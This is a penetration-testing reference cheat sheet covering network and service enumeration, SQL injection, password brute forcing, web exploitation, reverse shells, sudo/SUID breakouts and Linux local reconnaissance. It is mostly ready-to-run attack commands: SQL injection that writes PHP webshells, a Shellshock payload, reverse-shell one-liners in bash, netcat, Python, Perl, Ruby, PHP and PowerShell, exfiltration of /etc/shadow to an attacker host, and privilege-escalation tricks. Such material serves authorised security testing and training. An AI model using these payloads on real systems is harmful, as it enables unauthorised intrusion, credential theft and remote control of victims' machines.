---
title: pentesting reference
published_at: 2018-12-20
last_modified_at: 2018-12-20
---

# Penetration Testing Reference

## Remote Information Gathering

* The cooliest scan of all: [bscan](https://github.com/welchbj/bscan)
``` sh
bscan --verbose-status --max-concurrency 50 <targets>
```

* `nmap` quickstart on target; use this to get started and then run a more comprehensive scan in the background
``` sh
nmap -v -F -sV -Pn <ip>
```

* `nmap` full port range not-too-slow scan (a good initial scan on a target)
``` sh
nmap -p- -sV -sS -T4 <ip>
```

* `nmap` aggressively (`-A`) scan all of the open most common TCP ports on the target
``` sh
TARGET=<ip>; nmap -Pn -oG - $TARGET  | awk -F'[/ ]' '{h=$2; for(i=1;i<=NF;i++){if($i=="open"){print $(i-1)}}}' | paste -sd "," - | xargs -I{} nmap -A -oA "scan-$TARGET" -pT:{} $TARGET
```

* `nmap` OS detection
``` sh
nmap -O <target>
```

* `nmap` comprehensive, very thorough host discovery
``` sh
nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" <target>
```

* `nmap` ping scan a network
``` sh
nmap -sP <ip>/<cidr>
```

* Faster scan of all open ports with `unicornscan`
``` sh
unicornscan -p a <ip>
```

* HTTP enumeration
``` sh
# run nmap NSE http scripts
nmap -Pn -p 80 --script http-vuln* <ip>

# heartbleed NSE script
nmap -Pn -p 443 --script ssl-heartbleed <ip>

# look for vulnerabitilies and server information
nikto -host <ip> -port <port>

# kali wordlists
ls -l /usr/share/wordlists

# dirb directory scan
dirb <url>

# gobuster directory scan
gobuster -w /usr/share/dirb/wordlists/common.txt -u <url> -f -l

# wfuzz fuzz URLS; lots of other fuzzing options, too
wfuzz -c -z <wordlist> --hc 404 http://<target>:<port>/FUZZ

# check the options on a directory; look for `Allow: PUT` to upload files
curl -v -X OPTIONS http://<host>/<directory>

# test file upload on directory that allows PUT
curl -v -X PUT -d '<?php echo shell_exec($_GET["cmd"]);?>' http://<host>/<directory>/webshell.php
curl -v -X PUT -T <pathtofile> http://<host>/<directory>/<destfilename>

# if curl file upload works and the target is Windows, it is worth exploring WebDav upload via `cadaver`
# below also shows a workaround for .asp file upload filters <= IIS 6.0
cadaver <target>
dav:/> put shell.asp.txt
dav:/> copy shell.asp.txt shell.asp;.txt # alternative to `copy` is `move`
# file is now executable and exposed in IIS directory

# further WebDAV enumeration
davtest -url <url>

# retrieve files via dotdot paths with `dotdotpwn`; this works with other protocols, too
dotdotpwn -m http -h <ip> -x <port> -f <pathtoretrieve> -k <keywordthatmustbepresent> -d <depth> -t <millisperrequest> -s

# check web application firewalls
wafw00f http://<ip>:/<port>/
```

* FTP enumeration
``` sh
# run nmap NSE scripts
nmap -v -p21 -Pn --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <target>
```

* SMB enumeration (look for [Samba 2.2.x](https://www.exploit-db.com/exploits/7/))
``` sh
# run nmap smb-vuln scripts
nmap -Pn -p 135,139,445 --script smb-vuln* <ip>

# get netbios information
nmap -sU --script nbstat.nse -p 137 <ip>

# automated enumeration
enum4linux -a <ip>

# spider the C drive for files with "txt" in the name
crackmapexec smb <ip> -u <username> -p <password> --spider C\$ --pattern txt

# null authentication using network and local accounts; use `-d` option to specify domain
crackmapexec smb <ip>/<cidr> -u '' -p ''
crackmapexec smb <ip>/<cidr> -u '' -p '' --local-auth

# manual directory exploration
smbclient -L <ip>
smbclient \\\\<ip>\\<share>
```

* NFS enumeration
``` sh
# nmap enumeration
nmap -vv -Pn --script=nfs-showmount <ip>

# manual exploration
showmount -e <ip>

# test privilege escalation by mounting directory to target with suid shell (looking to do this with NFS version 3)
mkdir /tmp/test
mount -t nfs -o vers=3 <ip>:/home /tmp/test
cp /bin/bash /tmp/test/bash
chmod +s /tmp/test/bash

# nfs mounting with suid is applicable with disabled root squashing in `/etc/exports`
cat /etc/exports | grep no_root_squash
```

* SNMP enumeration
``` sh
# nmap NSE scripts
nmap -vv -Pn -p 161 --script=snmp-netstat,snmp-processes <ip>

# automated enumeration
onesixtyone <ip>
snmpwalk -c <communitystr> -v1 <ip>
```

* SMTP enumeration
``` sh
nmap -vv -Pn -p <ports> --script=smtp-ntlm-info,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 <ip>
smtp-user-enum -M VRFY -U <userlist> -t <ip>
```

* LDAP enumeration
``` sh
# simple enumeration on a domain controller
enum4linux -l <ip>
```

* DNS enumeration
``` sh
# run `nmap` dns scripts
nmap -v -Pn -p53 --script=dns-service-discovery,dns-cache-snoop,dns-check-zone,dns-zone-transfer <ip>

# find the DNS servers a domain has
host -t ns <url>
host -l <url> <nsurl>

# execute a zone transfer on vulnerable server
nslookup
> server <dnsserver>
> set type=any
> ls -d <ip>

# automated DNS enumeration
dnsrecon -t axfr <ip>

# zone transfer with dig
dig axfr <domain> @<nsip>
```

* RPC enumeration; check out [SANS practical usage of `rpcclient`](https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions)
``` sh
# display list of RPC programs
rpcinfo -p <ip>

# interact with MS-RPC
rpcclient -U '' <ip>

# probe the NFS server on the machine
showmount -e <ip>

# enum via Nmap script
nmap -vv -Pn -p <ports> --script=msrpc-enum <ip>
```

* Kerberos enumeration
``` sh
nmap -vv -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<realm>' <ip>
```

* WPScan
``` sh
# non-intrusive scan
wpscan --url <url>

# enumerate installed plugins
wpscan --url <url> --enumerate p

# enumerate vulnerable plugins
wpscan --url <url> --enumerate vp

# enumerate vulnerable themes
wpscan --url <url> --enumerate vt

# scan custom content directory
wpscan -u <url> --wp-content-dir custom-content
```

* ColdFusion enumeration ([APSA13-01](https://nmap.org/nsedoc/scripts/http-adobe-coldfusion-apsa1301.html), [subzero](https://nmap.org/nsedoc/scripts/http-coldfusion-subzero.html), [CVE-2009-3960](https://nmap.org/nsedoc/scripts/http-vuln-cve2009-3960.html), [CVE-2010-2861](https://nmap.org/nsedoc/scripts/http-vuln-cve2010-2861.html))
``` sh
nmap -Pn -p 80 --script http-adobe-coldfusion-apsa1301,http-coldfusion-subzero,http-vuln-cve2009-3960,http-vuln-cve2010-2861 <ip>
```

* Excluding items from `searchsploit` results
```sh
searchsploit <query> | grep -v '/dos/'

# we may want to remove color from searchsploit via `--colour` so as to not confuse grep
```


## SQL Injection / Manipulation

* MySQL default login
``` sh
mysql -u root -proot <target>
```

* MySQL attempt system command execution ([helpful resource](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/))
``` sql
SELECT sys_exec('id');
SELECT sys_eval('id');
```

* (MySQL) Discover number of columns in a table via SELECT null enumeration
``` sql
SELECT * FROM my_table WHERE my_column='something' AND '0'='1' UNION SELECT null,null,null,null,null,null,null,null; --
                                       ^                                    ^                                          ^
                                       |                                    |           trailing space is important ___|
                                       |   enumerate on number of nulls ____|
 vulnerable queries let us inject _____|   until we hit some empty result
 after this position
```

* (MySQL) Read a file from the target via FILE privileges
``` sql
SELECT * FROM my_table WHERE my_column='something' AND '0'='1' UNION SELECT null,load_file('/etc/passwd'),null; --
```

* (MySQL) Writing a webshell to target file system via FILE privileges
``` sql
SELECT * FROM my_table WHERE my_column='something' AND '0'='1' UNION SELECT null,'<?php echo shell_exec($_GET[\'cmd\']); ?>',null INTO OUTFILE '/var/www/html/webshell.php'; --
                                                                                                               ^    ^
                                                                              escaping these is important _____|____|
```

* Connect to an MS-SQL instance
``` sh
sqsh -S <ip>:<port> -U <user>
```

* Dump MS-SQL hashes via `nmap`
``` sh
nmap -Pn -p <port> --script=ms-sql-dump-hashes --script-args='mssql.username=<user>,mssql.password=<pass>,mssql.instance-port=<port>' <ip>
```

* Execute shell commands via MS-SQL and `nmap`
``` sh
nmap -p <port> --script ms-sql-xp-cmdshell --script-args='mssql.username=sa,mssql.password=password,mssql.instance-port=<port>,ms-sql-xp-cmdshell.cmd="<cmd>"' <ip>
```

* Enumerate Oracle database via Metasploit's `auxiliary/admin/oracle/oraenum`

* `sqlmap` dump table from a vulnerable form
``` sh
sqlmap -o -u "http://website.com/vuln-form" --forms -D <dbname> -T <tablename> --dump
```

* `sqlmap` exploit a vulnerable POST endpoint
``` sh
sqlmap -u <target> -p <param> --data=<postdata> --cookie=<cookie> --level=3 --current-user --current-db --passwords --file-read="/etc/passwd"
```

* `sqlmap` get an OS shell
``` sh
sqlmap --dbms=mysql -u "http://website.com/login.php" --os-shell
```


## SQL Information Gathering

* (MySQL) Show all non-empty tables
``` sql
SELECT table_type, table_name FROM information_schema.tables WHERE table_rows >= 1;
```


## Password / Key / Username Brute Force

* `nmap` brute forces with custom user/pass lists
``` sh
# ftp
nmap --script ftp-brute --script-args userdb=/usr/share/wordlists/nmap.lst,passdb=/usr/share/wordlists/fasttrack.txt -pT:21 <ip>

# ssh
nmap --script ssh-brute --script-args userdb=/usr/share/wordlists/nmap.lst,passdb=/usr/share/wordlists/fasttrack.txt -pT:22 <ip>
```

* Hash identification ([example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes))
``` sh
# identify hash type locally
hashid <hash>
hash-identifier

# remote search for previously-cracked hash
findmyhash <algorithm> -h <hash>
```

* Hash generation
``` sh
# hash accepted in /etc/shadow
perl -e 'print crypt("YourPasswd", "salt"),"\n"'

# generate hash to put as root's password in /etc/passwd
openssl passwd <password>

# md5 hash from string
echo -n "mystring" | md5sum

# generating a PHP password hash
$ php -a
php > echo password_hash('<password>', PASSWORD_DEFAULT);
```

* `wpscan` WordPress cracking
``` sh
# wordlist using 50 threads
wpscan --url www.example.com --wordlist /usr/share/wordlists/fasttrack.txt --threads 50

# accept wordlist from stdin
crunch 5 13 -f charset.lst mixalpha | wpscan --url www.example.com --wordlist -

# brute force a specific user; in this case `admin`
wpscan --url www.example.com --wordlist darkc0de.lst --username admin
```

* `john` cracking
``` sh
# wordlist mode
john --wordlist=password.lst hash.lst

# incremental brute force
john --incremental hash.lst

# cracking a ZIP archive
zip2john <zipfile> > hash.lst && john --format=zip hash.lst

# cracking a RAR archive
rar2john <zipfile> > hash.lst && john --format=rar hash.lst

# cracking compromised `/etc/passwd` and `/etc/shadow`
unshadow stolen-passwd.txt stolen-shadow.txt > <fout>
john <fout>
```

* `hydra` brute forcing
``` sh
# ftp
hydra -l <username> -P /usr/share/wordlistsnmap.lst -f <ip> ftp -V

# pop3
hydra -l <username> -P /usr/share/wordlistsnmap.lst -f <ip> pop3 -V

# smtp
hydra -l <username> -P /usr/share/wordlistsnmap.lst -f <ip> smtp -V
```

* `medusa` brute forcing
``` sh
medusa -u <user> -P <wordlist> -h <ip> -M <protocol>
```

* `ncrack` rdesktop brute forcing
``` sh
ncrack -vv --user administrator -P <passwordlist> rdp://<ip>:<port>
```

* `patator` brute forcing
``` sh
patator ssh_login host=<ip> port=<port> user=<user> password=FILE0 0=<passwordlist> persistent=0 -x ignore:mesg='failed.'
```

* `cewl` wordlist generation from the content of a web page
``` sh
cewl -d <depth> -m <minwordlength> -w <outfilename> <url>
```

* `crunch` wordlist generation
``` sh
# generate wordlist of alphabetical permutations; this example generates permutations from length 1 to 5
crunch 1 5 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

# prefix wordlists (`@` = lowercase, `,` = uppercase, `%` = numbers, `^` = symbols)
crunch 5 5 -t pass%%%

# use a predefined character set; this example uses uppercase alphabetical characters and begins at `BB`
crunch 2 3 -f charset.lst ualpha -s BB
```

* Applying `john` rules to an existing wordlist
```sh
john --wordlist=<wordlist> --rules --stdout > <fout>
```

* SSH see if the host's key fingerprint is known
  * [Rapid7 SSH bad keys](https://github.com/rapid7/ssh-badkeys)
  * [Kompromat project](https://github.com/BenBE/kompromat)

* SSH private key brute force
``` sh
# get the host key associated with a public key
ssh-keygen -l -E md5 -f <dsa_or_rsa_pub_key>

# apply a directory of private keys to a host; ensure public key is properly configured at `~/.ssh/id_rsa.pub`, `~/.ssh/id_dsa.pub`, etc.
crowbar -b sshkey -u <username> -k <privatekeydirectory> -s <ip>/32
```

* Look for an easy win from a public key with [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)


## Exploiting Web Applications

* [PayloadsAllTheThings assortment of payload formats](https://github.com/swisskyrepo/PayloadsAllTheThings)

* Common PHP web application methods
  * [PayloadsAllTheThings LFI/RFI PHP wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#lfi--rfi-using-wrappers)

  * LFI of PHP source files via `php://filter/convert.base64-encode/resource=<file>.php` filters; decode with `echo -n <base64payload> | base64 -d`

  * `phpinfo()` [LFI race condition](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)

  * [Pair LFI with injection to HTTP access logs](https://www.exploit-db.com/papers/12992/) via modification of HTTP request attributes to achieve RCE (see below for typical log locations)
```sh
# ubuntu / debin
/var/log/apache2/error.log
/var/log/apache2/access.log

# ubuntu-specific
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf

# centos / fedora / oel / rhel
/var/log/httpd/error_log
/var/log/httpd/access_log

# freebsd
/var/log/httpd-error.log
/var/log/httpd-access.log
```

* Using SMTP to upload a payload to a file accessible at `/var/mail/<victim>`
```sh
$ telnet <target> 25
EHLO <user>.<domain>.<tld>  <--- this doesn't matter
VRFY <victim>@localhost   <--- ensure our victim is a valid user
mail from: pwned@haha.io
rcpt to: <victim>@localhost
data  <--- begin the content of our email
Subject: you got pwned
<?php echo shell_exec($_GET['cmd']);?>

.  <--- end your email with CRLF.CRLF
# this email should now be accessible at /var/mail/<victim>; pair this with LFI for a webshell
```

* Gathering information from version control instances; possibilty of keys/credentials in commit history
```sh
# useful tool for git: https://github.com/koto/gitpillage
./gitpillage www.example.com
```

* Padding oracle attack for auth cookie; note that `auth=` in the below example should be change to matched the cookie you are cracking
```sh
padBuster <url> <cookiesample> <blocksize8or16> -cookies auth=<cookiesample>
```

* [Shell shock](https://github.com/opsxcq/exploit-CVE-2014-6271)
```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <url>
```

* Gathering information from [Meteor.js](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor)


## Reverse shells

* [URL encoder/decoder](https://meyerweb.com/eric/tools/dencoder/)

* Kali webshells
``` sh
ls /usr/share/webshells/
```

* Netcat listener
``` sh
nc -lvp <port>
```

* Netcat (Linux); below variations will work based on version / compilation flags
``` sh
nc <ip> <port> -e /bin/bash
nc -c /bin/sh <ip> <port>
/bin/sh | nc <ip> <port>
rm -f /tmp/p; mknod /tmp/p p && nc <ip> <port> 0/tmp/p
```

* Netcat (Windows)
``` sh
nc <ip> <port> -e cmd.exe
```

* Netcat without `-e` option
``` sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> >/tmp/f
```

* Bash
``` sh
bash -i >& /dev/tcp/<ip>/<port> 0>&1
exec /bin/bash 0&0 2>&0
```

* Perl via `/bin/sh`
``` sh
perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

* Perl without `/bin/sh`
``` sh
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<ip>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

* Perl for Windows
``` sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<ip>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

* Ruby via `/bin/sh`
``` sh
ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

* Ruby without `/bin/sh`
``` sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* Ruby for Windows
``` sh
ruby -rsocket -e 'c=TCPSocket.new("<ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* Python via `/bin/sh`
``` sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* PHP via `/bin/sh`
``` sh
php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

* PHP reverse shell in an image file
``` sh
exiftool -Comment='<?php echo shell_exec($_GET['cmd']); ?>' <outfilename>
```

* PowerShell
```posh
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<target>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

* Telnet
``` sh
rm -f /tmp/p; mknod /tmp/p p && telnet <ip> <port> 0/tmp/p
```

* Java
``` java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

* gawk
``` sh
#!/usr/bin/gawk -f
BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
close(cmd)
```

* Xterm
``` sh
# run on target; connects back to attack machine IP via TCP port 6001
xterm -display 10.0.0.1:1

# start X-Server on attack machine; listens on TCP port 6001
Xnest :1

# you likely need to authorize the target to connect to you; do so with the below command on attack machine
xhost +<targetip>
```


## Shell Manipulation

* [Collection of Python full PTY shells](https://github.com/infodox/python-pty-shells)

* Python PTY
``` sh
# spawn the PTY
python -c "import pty; pty.spawn('/bin/bash')"

# use below to get tab auto completion
CTRL-Z
stty raw -echo
fg

# get size of your local terminal with `stty size`, then update victim session with
stty rows <num> cols <num>
```

* Socat PTY
``` sh
# attacker machine
socat file:`tty`,raw,echo=0 tcp-listen:4444

# victim machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:4444
```

* STTY
``` sh
# reverse shell
python -c "import pty; pty.spawn('/bin/bash')"
CTRL-Z

# host
stty raw -echo
fg

# reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <num>
```

* Disable default shell and force to `bash`
``` sh
chmod 750 <tcsh/csh/ksh>
```

* Record a shell session (CTRL-D stops)
``` sh
script -a <outfile>
```


## Shell Breakouts / Abusing Misconfigured Sudo and SUID

* The ultimate reference: [GTFOBins](https://gtfobins.github.io)

* `vi` / `vim`
```sh
:set shell=/bin/bash
:shell
```
or
```sh
:! /bin/bash
```

* `gdb` / `iftop`
```sh
!sh
```

* `awk`
```sh
awk 'BEGIN {system("/bin/sh")}'
```

* `find`; note that this technique permits you to escape inital PATH execution restrictions
```sh
find / -name whatever -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

* `more`, `less`, and `man`
```sh
'! /bin/sh'
'!/bin/sh'
'!bash'
```

* `ftp`
```sh
sudo ftp
ftp> !
```

* `nmap`
```sh
# < 5.35DC1
sudo nmap --interactive
nmap> !sh

# >= 5.35DC1
echo "os.execute('/bin/sh')" > shell.nse
sudo nmap --script=shell.nse
```

* Reading and overwriting privileged files with `wget`
```sh
# attempts to use the contents of the specified file as remote resources
sudo wget -i /etc/shadow

# overwrite a privileged file with custom contents; use -nH option to avoid
# creating hostname directories
sudo wget <url> -O /etc/shadow

# send a file to our attack machine; listen with nc to grab the file contents
sudo wget --post-file=/etc/shadow <attackip>
```

* Reading privileged files with Apache
```sh
sudo apache2 -f /etc/shadow
```

* Command execution via `tcpdump`; executes commands from /tmp/.test file
```sh
echo id | tee /tmp/.test && sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

* Injecting command-line options into a cron job command that uses a wildcard
```sh
# abusing tar
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
touch /writable/path/used/by/tar/--checkpoint=1
touch /writable/path/used/by/tar/--checkpoint-action=exec=sh\ runme.sh

# abusing chown to change our setuid shell to be owned by root; requires our reference file to be owned by root
# perform below in a directory where root-privileged cronjob with some variation of `chown *` is run
touch -- --reference=<referencefileownedbyroot>
```

* IFS exploit on SUID program that calls a known program
```sh
# verify our shell payload
ls -l /home/me/bin

# alter PATH and IFS so that our local script `bin` will be executed
PATH=/home/me:${PATH}
export PATH
IFS=/
export IFS

# abuse the fact that /usr/local/date has sticky bit set and calls /bin/date
/usr/local/date

# we should be root now
```

* LD_PRELOAD exploit
```sh
$ cat root.c
main() {
    setuid(0);
    setgid(0);
    print("Got root");
}
$ gcc -o root root.c
$ cat root_so.c
void printf(char * str) {
    execl("/bin/sh", "sh", 0);
}
$ gcc -shared -o root_so.so root_so.c
$ LD_PRELOAD=./root_so.so
$ export LD_PRELOAD
$ ./root
# you should be root now
```


## Linux Local Information Gathering

* List Kernel / OS info
``` sh
cat /etc/issue && uname -a && cat /proc/version
```

* CentOS / RHEL specific
``` sh
cat /etc/redhat-release
```

* CPU details
``` sh
lscpu
uname -m
```

* Check if OS is 32-bit/64-bit (note that 64-bit CPUs running a 32-bit OS still return 32 here)
``` sh
getconf LONG_BIT
```

* Compiler and glibc info
``` sh
which gcc && gcc --version
which ldd && ldd --version
```

* File system information
``` sh
# unmounted file systems
cat /etc/fstab

# list connected drives
sudo fdisk -l
```

* Global SUID program search
``` sh
find /* -user root -perm -4000 -print 2>/dev/null
```

* Quicker SUID program search, looks in various ``bin`` directories
``` sh
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
```

* Current user world writable directories
``` sh
find / '(' -type f -or -type d ')' '(' '(' -user  nobody -perm -u=w ')' -or '(' -group nobody -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2>/dev/null
```

* World writable directories
``` sh
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
find / -writable -type d 2>/dev/null
```

* World writable directories for root
``` sh
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
```

* World writable files
``` sh
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
```

* ``/etc`` world writable files
``` sh
find /etc -perm -2 -type f 2>/dev/null
```

* ``/etc`` config files
``` sh
ls -ls /etc/ | grep .conf
```

* Writable configuration files
``` sh
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null
find /etc/ -readable -type f 2>/dev/null
find /etc/ -readable -type f -maxdepth 1 2>/dev/null
```

* Check environment variables
``` sh
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

* Show users
``` sh
# current user
id && groups

# information about another user
id <username> && groups <username>

# list users
cat /etc/passwd | cut -d : -f 1

# list super users
awk -F: '($3 == "0") {print}' /etc/passwd

# list logged in users
w

# last logged in user
last -a

# get user information
who -a

# additional information
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

* Sudo information
``` sh
# list sudoers
cat /etc/sudoers

# show which commands you can run
sudo -l
```

* Running processes (look for things like [`udev`](https://www.exploit-db.com/exploits/8572/))
``` sh
ps aux
```

* Service information; `[+]`/`[-]` indicate whether service does/doesn't start at boot
``` sh
# list services
service --status-all

# check the status of a service
service <service> status
```

* `chkconfig` information; RHEL/CentOS specific
``` sh
# list existing services and run status
chkconfig --list

# check single service status
chkconfig <service> -list
```

* List open files (``lsof``) recipes
``` sh
# files opened by specific user
lsof -u brian

# processes running on a specific port; also accepts ranges of ports
lsof -i TCP:22

# IPv4 open files only; replace 4 with 6 for IPv6
lsof -i 4

# exclude a user from results
lsof -i -u^root
```

* Installed applications
``` sh
# Common
ls -alh /usr/bin/
ls -alh /sbin/

# Debian-based
dpkg -l
dpkg -get-selections
ls -alh /var/cache/apt/archivesO

# Redhat / CentOS / Fedora
rpm -qa
rpm --query -all
ls -alh /var/cache/yum/
ls -alh /var/cache/dnf/

# Solaris
pkginfo
```

* ``root`` / ``home`` directories
``` sh
ls -ahlR /root/
ls -ahlR /home/
```

* Scheduled jobs (look for things like [`chkrootkit`](https://www.exploit-db.com/exploits/33899/))
``` sh
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

* History files
``` sh
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

* Common website directories
``` sh
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

* Common configuration files
``` sh
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/php5/apache2/php.ini
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

* Common logging files
``` sh
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
```

* SSH keys
``` sh
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

* Automated privilege escalation checking scripts ([linenum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and [linuxprivechecker.py](http://www.securitysift.com/download/linuxprivchecker.py))
``` sh
python linuxprivchecker.py
./linenum.sh
```

* [Kernel exploits](https://github.com/lucyoa/kernel-exploits)


## Linux Network Information Gathering

* Get the hostname from an IP
``` sh
nbstat -A <ip>
```

* Monitor network connections
``` sh
# network connections
watch ss -tp

# TCP connections
netstat -ant

# UDP connections
netstat -anu

# connections with PIDs
netstat -tulpn
```

* SMB connections
``` sh
# mount Windows share
share user <ip> c$

# SMB connection
smblient -U user \\\\<ip>\\<share>
```

* List all `iptables` rules
``` sh
iptables -L -v --line-numbers
```

* Manipulate MACs
``` sh
# change MAC (each line is a separate method)
export MAC=xx:xx:xx:xx:xx:xx
ifconfig <int> hw ether <MAC>
```

* Query DNS information
``` sh
# domain lookup for IP
dig -x <ip>
host <ip>

# domain SRV lookup
host -t SRV _<service>.tcp.url.com
```

* Manipulate DNS
``` sh
# DNS zone transfer
dig @<ip> domain -t AXFR
host -l <domain> <namesvr>

# Add a DNS server
echo "nameserver <ip>" > /etc/resolv.conf
```

* Wifi scanning
``` sh
iwlist <int> scan
```

* List VPN keys
``` sh
ip xfrm state list
```

* Ping sweep on a range of IPs
``` sh
for x in {1..254..1}; do ping 0c 1 1.1.1.$x | grep "64 b" | cut -d" " -f4 > ips.txt; done
```

* DNS reverse lookup
``` sh
for x in {1..254..1}; do dig -x 1.1.1.$x | grep $x > dns.txt; done
```

* Automated domain name resolve script
``` sh
#!/bin/bash
